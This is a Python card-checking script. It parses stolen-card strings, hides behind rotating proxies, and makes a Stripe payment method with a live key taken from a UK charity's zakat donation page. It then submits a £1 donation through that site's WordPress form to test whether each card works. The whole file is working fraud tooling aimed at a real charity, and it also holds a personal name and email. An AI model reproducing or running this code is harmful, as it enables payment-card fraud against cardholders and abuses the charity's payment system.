import random
import requests, re, time
from utils import lookBin, genProxy


def Tele(ccx):
    try:
        import requests
        r = requests.session()

        urlToGet = "http://api.ipify.org/"
        r = requests.get(urlToGet, proxies=genProxy())
        ip=r.text
    except:
        ip="something wrongs"
    try:
        import requests

        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
        if "20" in yy:  # Mo3gza
            yy = yy.split("20")[1]
        time.sleep(random.randrange(2,7))

##REQ1 
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=9ffc663c-69d5-4005-aabd-782094c4d8ad1ddbb2&muid=12c85d48-8274-4fae-81f5-0ffac94b0da097f8fc&sid=a5df6da6-d1e5-49ac-8240-62be661705723174a0&payment_user_agent=stripe.js%2Fab4f93f420%3B+stripe-js-v3%2Fab4f93f420%3B+card-element&referrer=https%3A%2F%2Falfurqanmcr.org&time_on_page=26689&key=pk_live_51Mrfm6A2rsxWxTcKIUzeVIi0SqsWAyCE5FsQSuTkKNJXgzh126h7goCV2DZ7pqpb0YMA7q9G2wN7ORYETXBSHuwD00RD4MJjV7'

        r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        try:
        	pm = r1.json()['id']
        except:
        	pass


        cookies = {
    '__stripe_mid': '12c85d48-8274-4fae-81f5-0ffac94b0da097f8fc',
    '__stripe_sid': 'a5df6da6-d1e5-49ac-8240-62be661705723174a0',
}

        headers = {
    'authority': 'alfurqanmcr.org',
    'accept': '*/*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '__stripe_mid=12c85d48-8274-4fae-81f5-0ffac94b0da097f8fc; __stripe_sid=a5df6da6-d1e5-49ac-8240-62be661705723174a0',
    'origin': 'https://alfurqanmcr.org',
    'referer': 'https://alfurqanmcr.org/zakat/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

        params = {
    't': '1732945654813',
}

        data = {
    'data': f'__fluent_form_embded_post_id=4829&_fluentform_37_fluentformnonce=59c1417611&_wp_http_referer=%2Fzakat%2F&names%5Bfirst_name%5D=Khant%20Ti&names%5Blast_name%5D=Kyi&email=thur07656%40gmail.com&address_1%5Baddress_line_1%5D=Hddhxh&address_1%5Baddress_line_2%5D=Hhxhh&address_1%5Bcity%5D=Hhhh&address_1%5Bzip%5D=Zhzhx&address_1%5Bcountry%5D=GB&payment_input=Other&custom-payment-amount=1&payment_method=stripe&__stripe_payment_method_id={pm}',
    'action': 'fluentform_submit',
    'form_id': '37',
}

        r2 = requests.post(
    'https://alfurqanmcr.org/wp-admin/admin-ajax.php',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
)
        return (ccx, r2.json(),ip)
    except:
        return "error", "error",ip
